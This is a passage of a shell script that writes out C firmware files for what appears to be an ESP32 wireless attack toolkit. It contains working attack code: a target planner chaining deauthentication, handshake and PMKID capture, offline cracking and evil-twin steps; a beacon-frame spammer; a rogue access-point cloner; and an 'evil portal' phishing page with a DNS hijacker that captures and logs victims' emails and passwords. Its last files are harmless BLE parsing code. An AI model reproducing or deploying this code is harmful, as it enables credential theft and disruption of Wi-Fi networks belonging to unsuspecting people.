        return ESP_ERR_NO_MEM;
    }
    memset(&g_stats, 0, sizeof(g_stats));
    ESP_LOGI(TAG, "attack planner init");
    return ESP_OK;
}

esp_err_t attack_planner_build_plan(uint32_t ap_index, attack_plan_t *out)
{
    if (out == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    memset(out, 0, sizeof(*out));

    uint32_t count = wifi_sniffer_get_ap_count();
    if (ap_index >= count) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_ARG;
    }

    ap_info_t ap;
    esp_err_t rc = wifi_sniffer_get_ap(ap_index, &ap);
    if (rc != ESP_OK) {
        xSemaphoreGive(g_lock);
        return rc;
    }

    snprintf(out->bssid, sizeof(out->bssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    snprintf(out->ssid, sizeof(out->ssid), "%s", ap.ssid);
    out->channel = ap.channel;
    out->security = ap.rsn_version ? (ap.wpa3_sae ? 4 : 3) : 0;
    out->pmf_required = ap.pmf_required;
    out->score = score_ap(&ap);

    /* Build warning string */
    if (ap.wpa3_sae) {
        snprintf(out->warning, sizeof(out->warning),
                 "WPA3 target; deauth may not work");
    } else if (ap.pmf_required) {
        snprintf(out->warning, sizeof(out->warning),
                 "PMF required; use disassoc frames");
    } else if (!ap.rsn_version) {
        snprintf(out->warning, sizeof(out->warning),
                 "Legacy/open security; easy target");
    } else {
        snprintf(out->warning, sizeof(out->warning), "WPA2/WPA; capture handshake");
    }

    build_steps(&ap, out->steps, &out->step_count);

    /* Build summary string */
    int n = snprintf(out->summary, sizeof(out->summary),
                     "Target %s [%s] ch %u score %.2f: ",
                     out->bssid, out->ssid, out->channel, out->score);
    for (uint8_t i = 0; i < out->step_count && n + 32 < (int)sizeof(out->summary); i++) {
        n += snprintf(out->summary + n, sizeof(out->summary) - (size_t)n,
                      "%s -> ", attack_step_name(out->steps[i]));
    }
    /* Trim trailing arrow */
    if (n > 4 && strcmp(out->summary + n - 4, " -> ") == 0) {
        out->summary[n - 4] = '\0';
    }

    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t attack_planner_best_target(uint32_t *out_index)
{
    if (out_index == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    uint32_t count = wifi_sniffer_get_ap_count();
    if (count == 0) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_NOT_FOUND;
    }

    float best_score = -1.0f;
    uint32_t best_idx = 0;

    for (uint32_t i = 0; i < count; i++) {
        ap_info_t ap;
        esp_err_t rc = wifi_sniffer_get_ap(i, &ap);
        if (rc != ESP_OK) continue;

        float s = score_ap(&ap);
        if (s > best_score) {
            best_score = s;
            best_idx = i;
        }
    }

    *out_index = best_idx;
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t attack_planner_get_stats(planner_stats_t *out)
{
    if (out == NULL) return ESP_ERR_INVALID_ARG;
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }
    memcpy(out, &g_stats, sizeof(g_stats));
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t attack_planner_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    planner_stats_t st;
    esp_err_t rc = attack_planner_get_stats(&st);
    if (rc != ESP_OK) return rc;

    int n = snprintf(buf, bufsz,
                     "{\"ap_count\":%u,\"viable\":%u,\"best_idx\":%u,\"best_score\":%.2f}",
                     (unsigned)st.ap_count, (unsigned)st.viable_count, (unsigned)st.best_idx, (double)st.best_score);
    return (n < 0 || (size_t)n >= bufsz) ? ESP_ERR_NO_MEM : ESP_OK;
}

esp_err_t attack_planner_deinit(void)
{
    if (g_lock != NULL) {
        vSemaphoreDelete(g_lock);
        g_lock = NULL;
    }
    memset(&g_stats, 0, sizeof(g_stats));
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/attack_planner.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/attack_planner.h"
#ifndef ATTACK_PLANNER_H
#define ATTACK_PLANNER_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Attack step type. */
typedef enum {
    ATTACK_STEP_NONE = 0,
    ATTACK_STEP_DEAUTH,
    ATTACK_STEP_DISASSOC,
    ATTACK_STEP_AUTH_FLOOD,
    ATTACK_STEP_HANDSHAKE_CAPTURE,
    ATTACK_STEP_PMKID_CAPTURE,
    ATTACK_STEP_OFFLINE_CRACK,
    ATTACK_STEP_EVIL_TWIN,
    ATTACK_STEP_BEACON_FLOOD
} attack_step_t;

/* Attack plan for one target. */
typedef struct {
    char bssid[18];
    char ssid[33];
    uint8_t channel;
    uint8_t security; /* 0=open, 1=WEP, 2=WPA, 3=WPA2, 4=WPA3 */
    bool pmf_required;
    float score; /* 0.0 = worthless, 1.0 = perfect target */
    char warning[128];
    uint8_t step_count;
    attack_step_t steps[6];
    char summary[160];
} attack_plan_t;

/* Target scoring result. */
typedef struct {
    uint32_t ap_count;
    uint32_t viable_count;
    uint32_t best_idx;
    float best_score;
} planner_stats_t;

/* Initialize attack planner. */
const char *attack_step_name(attack_step_t step);

/* Initialize attack planner. */
esp_err_t attack_planner_init(void);

/* Build an attack plan for the AP at given index. */
esp_err_t attack_planner_build_plan(uint32_t ap_index, attack_plan_t *out);

/* Auto-select the best target. */
esp_err_t attack_planner_best_target(uint32_t *out_index);

/* Get planner statistics. */
esp_err_t attack_planner_get_stats(planner_stats_t *out);

/* Export stats as JSON. */
esp_err_t attack_planner_json(char *buf, size_t bufsz);

/* Deinit. */
esp_err_t attack_planner_deinit(void);

#ifdef __cplusplus
}
#endif

#endif /* ATTACK_PLANNER_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/attack_planner.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/beacon_spam.c"
#include <stdatomic.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include "beacon_spam.h"
#include "wifi_sniffer.h"
#include "led_indicator.h"
#include "deauth_engine.h"
#include "cred_sniffer.h"
#include "handshake_crack.h"
#include "stealth.h"
#include "watchdog.h"
#include "wifi_tx_fix.h"

#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "esp_log.h"

#include "lwip/sockets.h"
#include "lwip/netdb.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "beacon_spam";

/* ==========================================================================
 *  SECTION 1: BEACON SPAM
 * ========================================================================== */

static atomic_bool g_beacon_spam_active = ATOMIC_VAR_INIT(false);
static atomic_bool g_rogue_active = ATOMIC_VAR_INIT(false);
static atomic_bool g_portal_active = ATOMIC_VAR_INIT(false);
static TaskHandle_t g_beacon_task_handle = NULL;

static char g_beacon_ssids[MAX_BEACON_SSIDS][33];
static int g_beacon_ssid_count = 0;
static uint8_t g_beacon_channel = 1;
static uint32_t g_beacon_interval_ms = 100;
static uint8_t g_beacon_base_mac[6];
static uint16_t g_beacon_seq = 0;

static const char *const BUILTIN_BEACONS[] = {
    "FREE_WIFI", "FBI_Surveillance_Van", "NeverGonnaGiveYouUp",
    "Password_is_12345678", "Get_Your_Own_WiFi", "Mom_Use_This_One",
    "PrettyFlyForAWiFi", "Drop_It_Like_Its_Hotspot", "No_Internet_Here",
    "Virus_Distribution_Center", "Loading...", "404_Network_Not_Found",
    "The_LAN_Before_Time", "Wu-Tang_LAN", "Bill_Wi_the_Science_Fi",
    "I_Can_Hear_You_Typing", "Tell_My_WiFi_Love_Her", "It_Hurts_When_IP",
    "LAN_Solo", "The_Promised_LAN", "Hide_Yo_Kids_Hide_Yo_WiFi",
    "Connecting...", "TP-LINK_5G", "DIRECT-Apple-TV", "AndroidAP",
    "xfinitywifi", "attwifi", "Starbucks_WiFi", "Airport_Free_WiFi",
    "School_Guest"
};
#define BUILTIN_BEACON_COUNT (sizeof(BUILTIN_BEACONS) / sizeof(BUILTIN_BEACONS[0]))

static size_t build_beacon(uint8_t *f, const char *ssid, const uint8_t *bssid,
                           uint8_t channel, uint16_t seq)
{
    size_t i = 0;
    
    /* Frame control: Management, Beacon (0x80) */
    f[i++] = 0x80; f[i++] = 0x00;
    f[i++] = 0x00; f[i++] = 0x00;                 /* Duration */
    
    memset(f + i, 0xFF, 6); i += 6;               /* DA: Broadcast */
    memcpy(f + i, bssid, 6); i += 6;              /* SA: BSSID */
    memcpy(f + i, bssid, 6); i += 6;              /* BSSID */
    
    /* Sequence Control: Frag (4 bits) + Seq (12 bits) */
    uint16_t seq_ctrl = (seq & 0x0FFF) << 4;
    f[i++] = (uint8_t)(seq_ctrl & 0xFF);
    f[i++] = (uint8_t)((seq_ctrl >> 8) & 0xFF);

    /* Fixed params: Timestamp(8) + Beacon Interval(2) + Capability Info(2) */
    memset(f + i, 0, 8); i += 8;                  /* Timestamp */
    f[i++] = 0x64; f[i++] = 0x00;                 /* Interval: 100 TU */
    f[i++] = 0x01; f[i++] = 0x00;                 /* Cap Info: ESS, Open */

    /* SSID Tag */
    size_t slen = strlen(ssid);
    if (slen > 32) slen = 32;
    f[i++] = 0x00; f[i++] = (uint8_t)slen;
    memcpy(f + i, ssid, slen); i += slen;

    /* Supported Rates */
    static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    memcpy(f + i, rates, sizeof(rates)); i += sizeof(rates);

    /* DS Parameter Set (Channel) */
    f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;

    return i;
}

static void beacon_spam_task(void *arg)
{
    uint8_t frame[128];
    int idx = 0;

    while (atomic_load(&g_beacon_spam_active)) {
        watchdog_task_refresh(TAG);
        
        if (g_beacon_ssid_count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        uint8_t bssid[6];
        memcpy(bssid, g_beacon_base_mac, 6);
        bssid[5] = (uint8_t)((g_beacon_base_mac[5] + idx) & 0xFF);
        bssid[0] = (bssid[0] & 0xFE) | 0x02;      /* Locally administered MAC */

        size_t len = build_beacon(frame, g_beacon_ssids[idx], bssid,
                                  g_beacon_channel, g_beacon_seq++);
        wifi_tx_safe(WIFI_IF_AP, frame, len);

        idx = (idx + 1) % g_beacon_ssid_count;
        vTaskDelay(pdMS_TO_TICKS(g_beacon_interval_ms));
    }
    
    g_beacon_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t beacon_spam_start(const char **ssids, int count, uint8_t channel, uint32_t interval_ms)
{
    if (ssids == NULL || count <= 0) return ESP_ERR_INVALID_ARG;

    esp_err_t rc = stealth_check_tx("beacon_spam");
    if (rc != ESP_OK) {
        ESP_LOGE(TAG, "stealth blocked beacon_spam start");
        return rc;
    }

    /* Ensure mutual exclusivity with other radio modes */
    if (atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_stop();
    if (atomic_load(&g_rogue_active)) rogue_ap_stop();
    if (atomic_load(&g_portal_active)) evil_portal_stop();
    if (deauth_is_active()) deauth_stop();

    if (count > MAX_BEACON_SSIDS) count = MAX_BEACON_SSIDS;

    g_beacon_ssid_count = 0;
    for (int i = 0; i < count; i++) {
        snprintf(g_beacon_ssids[i], sizeof(g_beacon_ssids[i]), "%s", ssids[i]);
        g_beacon_ssid_count++;
    }

    g_beacon_channel = (channel >= 1 && channel <= 13) ? channel : 1;
    g_beacon_interval_ms = (interval_ms >= 20) ? interval_ms : 100;

    /* Bring up AP interface for raw TX */
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL || mode == WIFI_MODE_STA) {
        esp_wifi_set_mode(WIFI_MODE_AP);
        wifi_config_t ap = {0};
        snprintf((char *)ap.ap.ssid, sizeof(ap.ap.ssid), "esp_tx");
        ap.ap.ssid_len = 6;
        ap.ap.channel = g_beacon_channel;
        ap.ap.authmode = WIFI_AUTH_OPEN;
        ap.ap.max_connection = 0;
        esp_wifi_set_config(WIFI_IF_AP, &ap);
        esp_wifi_start();
    }
    
    esp_wifi_set_channel(g_beacon_channel, WIFI_SECOND_CHAN_NONE);
    esp_read_mac(g_beacon_base_mac, ESP_MAC_WIFI_SOFTAP);

    atomic_store(&g_beacon_spam_active, true);
    led_set_state(LED_STATE_SCANNING);

    if (xTaskCreatePinnedToCore(beacon_spam_task, "beacon_spam", 4096,
                                NULL, 5, &g_beacon_task_handle, 0) != pdPASS) {
        atomic_store(&g_beacon_spam_active, false);
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "Beacon spam: %d SSIDs on ch %u", g_beacon_ssid_count, g_beacon_channel);
    return ESP_OK;
}

esp_err_t beacon_spam_start_builtin(uint8_t channel)
{
    return beacon_spam_start((const char **)BUILTIN_BEACONS, (int)BUILTIN_BEACON_COUNT, channel, 50);
}

void beacon_spam_stop(void)
{
    atomic_store(&g_beacon_spam_active, false);
    if (g_beacon_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(150)); /* Wait for task to exit */
        g_beacon_task_handle = NULL;
    }
    led_set_state(LED_STATE_IDLE);
}

bool beacon_spam_is_active(void) { return atomic_load(&g_beacon_spam_active); }

/* ==========================================================================
 *  SECTION 2: ROGUE AP CLONE
 * ========================================================================== */

static char g_rogue_ssid[33] = {0};

esp_err_t rogue_ap_start(const char *ssid, uint8_t channel, bool open)
{
    if (ssid == NULL || ssid[0] == '\0') return ESP_ERR_INVALID_ARG;

    if (atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_stop();
    if (atomic_load(&g_beacon_spam_active)) beacon_spam_stop();
    if (atomic_load(&g_portal_active)) evil_portal_stop();
    if (deauth_is_active()) deauth_stop();

    snprintf(g_rogue_ssid, sizeof(g_rogue_ssid), "%s", ssid);

    wifi_config_t ap = {0};
    size_t ssid_len = strlen(ssid);
    if (ssid_len > sizeof(ap.ap.ssid)) ssid_len = sizeof(ap.ap.ssid);
    memcpy((char *)ap.ap.ssid, ssid, ssid_len);
    ap.ap.ssid_len = (uint8_t)ssid_len;
    ap.ap.channel = (channel >= 1 && channel <= 13) ? channel : 6;
    ap.ap.max_connection = 8;
    ap.ap.ssid_hidden = 0;

    if (open) {
        ap.ap.authmode = WIFI_AUTH_OPEN;
    } else {
        ap.ap.authmode = WIFI_AUTH_WPA2_PSK;
        snprintf((char *)ap.ap.password, sizeof(ap.ap.password), "password");
    }

    esp_err_t r = esp_wifi_set_mode(WIFI_MODE_AP);
    if (r != ESP_OK) return r;
    r = esp_wifi_set_config(WIFI_IF_AP, &ap);
    if (r != ESP_OK) return r;
    r = esp_wifi_start();
    if (r != ESP_OK) return r;

    atomic_store(&g_rogue_active, true);
    led_set_state(LED_STATE_CONNECTED);
    ESP_LOGI(TAG, "Rogue AP up: '%s' ch %u %s", ssid, ap.ap.channel, open ? "OPEN" : "WPA2");
    return ESP_OK;
}

void rogue_ap_stop(void)
{
    if (!atomic_load(&g_rogue_active)) return;
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    atomic_store(&g_rogue_active, false);
    led_set_state(LED_STATE_IDLE);
}

bool rogue_ap_is_active(void) { return atomic_load(&g_rogue_active); }

/* ==========================================================================
 *  SECTION 3: EVIL PORTAL (Captive Portal)
 * ========================================================================== */

static httpd_handle_t g_portal_httpd = NULL;
static TaskHandle_t g_dns_task_handle = NULL;
static atomic_bool g_dns_run = ATOMIC_VAR_INIT(false);

static const char PORTAL_HTML[] =
"<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
"<title>Sign in</title><style>"
"body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;padding-top:40px}"
".c{background:#fff;padding:24px;border-radius:8px;width:300px;box-shadow:0 2px 8px #0002}"
"h2{margin:0 0 12px;font-size:18px}input{width:100%;padding:10px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}"
"button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-size:15px;margin-top:8px}"
"</style></head><body><div class=c>"
"<h2>Network Login Required</h2>"
"<p style='color:#666;font-size:13px'>Enter your Wi-Fi password to continue.</p>"
"<form method=POST action=/login>"
"<input name=email type=email placeholder='Email' required>"
"<input name=password type=password placeholder='Password' required>"
"<button type=submit>Connect</button></form></div></body></html>";

static const char PORTAL_OK[] =
"<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:40px'>"
"<h2>Connected</h2><p>You may close this page.</p></body></html>";

/* Simple URL decoder for form data */
static void url_decode(char *str) {
    char *src = str, *dst = str;
    while (*src) {
        if (*src == '+') {
            *dst++ = ' ';
            src++;
        } else if (*src == '%' && src[1] && src[2]) {
            char hex[3] = { src[1], src[2], 0 };
            *dst++ = (char)strtol(hex, NULL, 16);
            src += 3;
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

static esp_err_t portal_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t portal_login_handler(httpd_req_t *req)
{
    char body[256] = {0};
    int r = httpd_req_recv(req, body, sizeof(body) - 1);
    if (r > 0) {
        cred_hit_t hit;
        memset(&hit, 0, sizeof(hit));
        snprintf(hit.host, sizeof(hit.host), "EVIL-PORTAL:%s", g_rogue_ssid);
        
        extract_kv(body, "email=", hit.user, sizeof(hit.user));
        if (!hit.user[0]) extract_kv(body, "username=", hit.user, sizeof(hit.user));
        extract_kv(body, "password=", hit.pass, sizeof(hit.pass));
        
        /* Decode URL-encoded characters like %20 or + */
        url_decode(hit.user);
        url_decode(hit.pass);
        
        hit.time_us = esp_timer_get_time();
        creds_push(&hit);

        if (hit.pass[0]) {
            handshake_save_password(g_rogue_ssid, hit.pass);
        }
        ESP_LOGW(TAG, "PORTAL CAPTURE user=%s pass=%s", hit.user, hit.pass);
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, PORTAL_OK, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t portal_catch_handler(httpd_req_t *req)
{
    return portal_get_handler(req);
}

static void dns_hijack_task(void *arg)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) { vTaskDelete(NULL); return; }

    /* Set timeout so task can exit cleanly when g_dns_run becomes false */
    struct timeval timeout = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY)
    };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    uint8_t buf[512];
    while (atomic_load(&g_dns_run)) {
        watchdog_task_refresh("dns_hijack");
        struct sockaddr_in src;
        socklen_t sl = sizeof(src);
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&src, &sl);
        if (n < 12) continue;

        uint8_t resp[512];
        memcpy(resp, buf, n);
        resp[2] = 0x81; resp[3] = 0x80;   /* flags: response, no error */
        resp[6] = 0x00; resp[7] = 0x01;   /* ANCOUNT = 1 */
        resp[8] = 0x00; resp[9] = 0x00;   /* NSCOUNT */
        resp[10] = 0x00; resp[11] = 0x00; /* ARCOUNT */

        int i = n;
        resp[i++] = 0xC0; resp[i++] = 0x0C; /* pointer to QNAME at offset 12 */
        resp[i++] = 0x00; resp[i++] = 0x01; /* type A */
        resp[i++] = 0x00; resp[i++] = 0x01; /* class IN */
        resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x1E; /* TTL 30s */
        resp[i++] = 0x00; resp[i++] = 0x04; /* RDLENGTH 4 */
        resp[i++] = 192; resp[i++] = 168; resp[i++] = 4; resp[i++] = 1;

        sendto(sock, resp, i, 0, (struct sockaddr *)&src, sl);
    }
    close(sock);
    g_dns_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t evil_portal_start(const char *ssid, uint8_t channel)
{
    esp_err_t r = rogue_ap_start(ssid, channel, true);
    if (r != ESP_OK) return r;

    /* Create default AP netif (ignore if already exists) */
    esp_netif_create_default_wifi_ap();

    atomic_store(&g_dns_run, true);
    xTaskCreatePinnedToCore(dns_hijack_task, "dns_hijack", 4096, NULL, 4, &g_dns_task_handle, 1);

    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = 80;
    cfg.max_uri_handlers = 8;
    cfg.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&g_portal_httpd, &cfg) != ESP_OK) {
        evil_portal_stop();
        return ESP_FAIL;
    }

    httpd_uri_t u_root = { .uri = "/", .method = HTTP_GET, .handler = portal_get_handler };
    httpd_uri_t u_login = { .uri = "/login", .method = HTTP_POST, .handler = portal_login_handler };
    httpd_uri_t u_all = { .uri = "/*", .method = HTTP_GET, .handler = portal_catch_handler };
    httpd_register_uri_handler(g_portal_httpd, &u_root);
    httpd_register_uri_handler(g_portal_httpd, &u_login);
    httpd_register_uri_handler(g_portal_httpd, &u_all);

    atomic_store(&g_portal_active, true);
    ESP_LOGI(TAG, "Evil portal live on '%s' (http://192.168.4.1/)", ssid);
    return ESP_OK;
}

void evil_portal_stop(void)
{
    atomic_store(&g_dns_run, false);
    if (g_dns_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(150)); /* Wait for DNS task to timeout and exit */
        g_dns_task_handle = NULL;
    }
    
    if (g_portal_httpd) {
        httpd_stop(g_portal_httpd);
        g_portal_httpd = NULL;
    }
    atomic_store(&g_portal_active, false);
    rogue_ap_stop();
}

void evil_portal_print_creds(void)
{
    creds_print();
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/beacon_spam.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_ext_adv.c"
#include "ble_ext_adv.h"
#include <string.h>
#include <stdbool.h>
#include "esp_log.h"


/* BLE advertising data types */
#define ADV_TYPE_FLAGS                   0x01
#define ADV_TYPE_NAME                    0x09
#define ADV_TYPE_MFG_DATA                0xFF
#define ADV_TYPE_AUX_PTR                 0x1F
#define ADV_TYPE_ADI                     0x29

/* ADI subfield: 2 bytes = SID + DID */

/* Extended advertising mode bits in ADI/header */
#define ADV_MODE_NONCONN                 (1 << 0)
#define ADV_MODE_SCANNABLE               (1 << 1)

/* TX Power level AD type */
#define ADV_TYPE_TX_POWER_LEVEL          0x0A

bool ble_ext_adv_parse(const uint8_t *data, uint8_t len,
                       bool *out_has_aux_ptr, bool *out_has_adi,
                       uint8_t *out_adv_mode, bool *out_has_scan_rsp,
                       uint8_t *out_tx_power)
{
    if (data == NULL || len == 0) return false;
    if (out_has_aux_ptr) *out_has_aux_ptr = false;
    if (out_has_adi) *out_has_adi = false;
    if (out_has_scan_rsp) *out_has_scan_rsp = false;
    if (out_adv_mode) *out_adv_mode = 0;
    if (out_tx_power) *out_tx_power = 0x7F;

    bool saw_ext = false;
    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t adv_len = data[pos];
        if (adv_len == 0) break;
        if (pos + 1 + adv_len > len) break;

        uint8_t type = data[pos + 1];
        uint8_t payload_len = adv_len - 1;

        switch (type) {
            case ADV_TYPE_AUX_PTR:
                if (out_has_aux_ptr) *out_has_aux_ptr = true;
                saw_ext = true;
                break;

            case ADV_TYPE_ADI:
                if (out_has_adi) *out_has_adi = true;
                saw_ext = true;
                if (payload_len >= 2) {
                    uint8_t mode = data[pos + 3] & 0x03;
                    if (out_adv_mode) *out_adv_mode = mode;
                }
                break;

            case ADV_TYPE_TX_POWER_LEVEL:
                if (out_tx_power && payload_len >= 1) {
                    *out_tx_power = data[pos + 2];
                }
                break;

            case ADV_TYPE_FLAGS:
                if (payload_len >= 1) {
                    uint8_t flags = data[pos + 2];
                    /* BR/EDR not supported + LE General = extended-capable */
                    if ((flags & 0x04) && (flags & 0x18)) saw_ext = true;
                }
                break;

            default:
                break;
        }

        pos += 1 + adv_len;
    }

    return saw_ext;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_ext_adv.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_ext_adv.h"
#ifndef BLE_EXT_ADV_H
#define BLE_EXT_ADV_H

#include <stdint.h>
#include <stdbool.h>
#include "common_types.h"
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Parse BLE 5.0 extended advertising fields from advertisement data.
 * Returns true if extended advertising evidence was found.
 * out_has_aux_ptr: true if Auxiliary Pointer present
 * out_has_adi:     true if Advertising Data Info present
 * out_adv_mode:    0=legacy, 1=non-connectable, 2=scannable
 * out_has_scan_rsp: true if this looks like a scan response
 * out_tx_power:    TX power in dBm if present, else 0x7F=unavailable */
static inline esp_err_t ble_ext_adv_init(void) { return ESP_OK; }

bool ble_ext_adv_parse(const uint8_t *data, uint8_t len,
                       bool *out_has_aux_ptr, bool *out_has_adi,
                       uint8_t *out_adv_mode, bool *out_has_scan_rsp,
                       uint8_t *out_tx_power);

#ifdef __cplusplus
}
#endif
#endif /* BLE_EXT_ADV_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_ext_adv.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_findmy.h"
#ifndef BLE_FINDMY_H
#define BLE_FINDMY_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

#define FINDMY_MAX_DEVICES 16

typedef struct {
    uint8_t mac[6];
    uint8_t status;
    uint8_t battery;
    bool valid;
} findmy_device_t;

esp_err_t findmy_init(void);
static inline esp_err_t ble_findmy_init(void) { return findmy_init(); }
void findmy_parse_adv(const uint8_t *adv, size_t len,
                      const uint8_t *mac);
size_t findmy_list(findmy_device_t *out, size_t max);
void findmy_clear(void);

#ifdef __cplusplus
}
#endif
#endif
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_findmy.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_gatt_client.c"
#include "ble_gatt_client.h"
#include <string.h>
#include <stdbool.h>
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "ble_scanner.h"
#if __has_include("host/ble_gap.h")
#include "host/ble_gap.h"
#include "host/ble_gatt.h"
#else
/* Fallback definitions when NimBLE is not enabled in sdkconfig */
#define BLE_GAP_EVENT_CONNECT       10
#define BLE_GAP_EVENT_DISCONNECT    11
#define BLE_GAP_EVENT_MTU           12
#define BLE_OWN_ADDR_RANDOM         1
#define BLE_ERR_REM_USER_CONN_TERM  0x13

typedef struct { uint8_t type; uint8_t val[6]; } ble_addr_t;
struct ble_gap_event {
    uint8_t type;
    struct { int status; uint16_t conn_handle; } connect;
    struct { int reason; } disconnect;
    struct { uint16_t value; } mtu;
};
struct ble_gap_conn_params {
    uint16_t scan_interval;
    uint16_t scan_window;
    uint16_t itvl_min;
    uint16_t itvl_max;
    uint16_t latency;
    uint16_t supervision_timeout;
    uint16_t min_ce_len;
    uint16_t max_ce_len;
};
static inline int ble_gap_connect(uint8_t own_addr_type, const ble_addr_t *peer_addr, int32_t duration_ms, const struct ble_gap_conn_params *params, int (*cb)(struct ble_gap_event *, void *), void *cb_arg) {
    (void)own_addr_type; (void)peer_addr; (void)duration_ms; (void)params; (void)cb; (void)cb_arg; return -1;
}
static inline int ble_gap_terminate(uint16_t conn_handle, uint8_t hci_reason) {
    (void)conn_handle; (void)hci_reason; return -1;
}
static inline int ble_gattc_disc_all_svcs(uint16_t conn_handle, void *cb, void *cb_arg) {
    (void)conn_handle; (void)cb; (void)cb_arg; return -1;
}
static inline int ble_gattc_disc_all_chrs(uint16_t conn_handle, uint16_t start_handle, uint16_t end_handle, void *cb, void *cb_arg) {
    (void)conn_handle; (void)start_handle; (void)end_handle; (void)cb; (void)cb_arg; return -1;
}
static inline int ble_gattc_read(uint16_t conn_handle, uint16_t attr_handle, void *cb, void *cb_arg) {
    (void)conn_handle; (void)attr_handle; (void)cb; (void)cb_arg; return -1;
}
#endif

/* nimble GAP event callback typedef */
typedef int (*ble_gap_event_fn_t)(struct ble_gap_event *event, void *arg);


static const char *TAG = "ble_gattc";

#define MAX_GATTC_CONNECTIONS 4
#define GATTC_CONNECT_TIMEOUT_MS 10000
#define GATTC_DISCOVERY_TIMEOUT_MS 5000

/* Per-connection state */
typedef struct {
    ble_gattc_conn_t conn_handle;
    uint8_t peer_mac[6];
    bool in_use;
    ble_gattc_state_t state;
    int connect_rc;
    int disc_rc;
    uint32_t connect_start_ms;

    /* Service discovery callback storage */
    ble_gattc_disc_svc_fn svc_cb;
    void *svc_cb_arg;
    ble_gattc_disc_char_fn char_cb;
    void *char_cb_arg;
} gattc_conn_state_t;

static gattc_conn_state_t g_conns[MAX_GATTC_CONNECTIONS];
static SemaphoreHandle_t g_gattc_lock = NULL;
/* Previous GAP callback chain removed: ble_gap_event_cb reads local
 * stack variables and is unsafe to call from another translation unit.
 * GATTC events are handled directly here without chaining. */

static void gattc_lock_init(void)
{
    if (g_gattc_lock == NULL) {
        g_gattc_lock = xSemaphoreCreateMutex();
    }
}

